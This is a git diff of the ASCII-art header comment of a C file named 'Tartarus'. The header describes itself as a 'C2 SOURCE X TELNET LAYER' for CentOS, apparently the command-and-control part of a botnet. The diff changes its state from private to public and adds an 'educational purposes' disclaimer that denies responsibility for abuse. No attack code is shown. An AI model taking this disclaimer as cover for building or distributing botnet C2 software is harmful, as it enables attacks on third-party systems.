@@ -1,38 +1,38 @@
 /*
 ╔═════════════════════════╗
 ║         Tartarus        ║                                 ╔═════════════════════════╗
-║           ---           ║                                 ║     TARTARUS : BETA     ║
+║           ---           ║                                 ║     Tartarus : BETA     ║
 ║          GL3.0          ║                                 ╚═════════════════════════╝
 ║           666           ║
 ╚═════════════════════════╝ 
 
-╔═════════════════════════════════════════════════════════════════╗
-║                             Vexvain                             ║                 
-║                                                                 ║                 
-╠═════════════════════════════════════════════════════════════════║
-║  LICENSING :  GNUV3 [GNU GENERAL PUBLIC LICENSE VERSION 3.0]    ║                                                                        
-║  VALID     :  03/23/19                                          ║                                                                       
-║  EXPIRY    :  03/23/22                                          ║                                                                         
-║  --                                                             ║                                                                                  
-║  STATE     :  PRIVATE                                           ║                                                                     
-║  OWNERSHIP :  N/A                                               ║ 
-║  NAME      :  TARTARUS                                          ║                                                                            
-║  --                                                             ║                                                                          
-║  CCR       : XXX-223-389                                        ║                                                                          
-║  CIPHER    : SHA-512 , AES-BYTE , CIPHER-TLS                    ║                                                                             
-║  GH-ID     : VEX-VAIN.SUCC                                      ║                                                                              
-║  --                                                             ║                                                                        
-║  OBJ-TYPE  : C2 SOURCE X TELNET LAYER                           ║  
-║  VSSH      : N/A                                                ║                                                                         
-║  OS_TYPE   : CENT_OS [6] - [7]                                  ║                                                                       
-║  --                                                             ║                                    
-║  BUILD     : BETA [RELEASE BEFORE VERSION I]                    ║ 
-║  DESC      : NET-WSS                                            ║   
-║  PRJ-VAS   : 6949-3853-9891                                     ║                                                                       
-║  --        :                                                    ║                                                                          
-║  --        :                                                    ║         
-║  DEV-ALIAS : VEXVAIN VEX                                        ║            
-╚═════════════════════════════════════════════════════════════════╩══════════════════════════════════════════════════════════════════════════════╝
+╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║ THIS VERSION WILL BE RELEASED TO THE PUBLIC FOR EDUCATIONAL PURPOSES. I AM NOT RESPONSIBLE FOR ANY CYBER ABUSE FROM THE COMMUNITY              ║                 
+║ IF YOU ARE USING THIS, PLEASE RESPECT THE AUTHORIZATION AND WORK THE DEVELOPERS HAVE PUT INTO THIS SOURCE / PROJECT                            ║                 
+╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╠
+                                        ║  LICENSING :  GNUV3 [GNU GENERAL PUBLIC LICENSE VERSION 3.0]    ║                                                                     
+                                        ║  VALID     :  10/01/20                                          ║                                                                    
+                                        ║  EXPIRY    :  10/01/23                                          ║                                                                        
+                                        ║  --                                                             ║                                                                                
+                                        ║  STATE     :  PUBLIC                                            ║                                                                    
+                                        ║  OWNERSHIP :  VEXVAIN                                           ║ 
+                                        ║  NAME      :  TARTARUS                                          ║                                                                          
+                                        ║  --                                                             ║                                                                        
+                                        ║  CCR       : XXX-223-389                                        ║                                                                        
+                                        ║  CIPHER    : SHA-512 , AES-BYTE , CIPHER-TLS                    ║                                                                        
+                                        ║  GH-ID     : VEXVAIN.HECK                                       ║                                                                            
+                                        ║  --                                                             ║                                                                     
+                                        ║  OBJ-TYPE  : C2 SOURCE X TELNET LAYER                           ║ 
+                                        ║  VSSH      : N/A                                                ║                                                                         
+                                        ║  OS_TYPE   : CENT_OS [6] - [7]                                  ║                                                                        
+                                        ║  --                                                             ║                                    
+                                        ║  BUILD     : BETA [WORK IN PROGRESS]                            ║ 
+                                        ║  DESC      : NET-WSS                                            ║        
+                                        ║  PRJ-VAS   : 6949-3853-9891                                     ║                                                                          
+                                        ║  --        :                                                    ║                                                                        
+                                        ║  --        :                                                    ║     
+                                        ║  DEV-ALIAS : VEXVAIN                                            ║                                                               
+                                        ╚═════════════════════════════════════════════════════════════════╩
 */
 
 #include <stdio.h>
